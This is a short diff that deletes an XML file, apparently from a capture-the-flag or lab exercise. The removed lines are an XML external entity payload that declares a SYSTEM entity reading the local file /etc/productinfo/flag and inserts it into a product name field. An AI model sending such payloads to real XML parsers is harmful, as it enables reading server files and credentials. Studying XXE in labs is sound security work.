@@ -1,3 +1,0 @@
-<?xml version="1.0"?>
-<!DOCTYPE root [<!ENTITY Drill SYSTEM 'file:///etc/productinfo/flag'>]>
-<product><name>&Drill;</name><price>1337&test;</price></product>
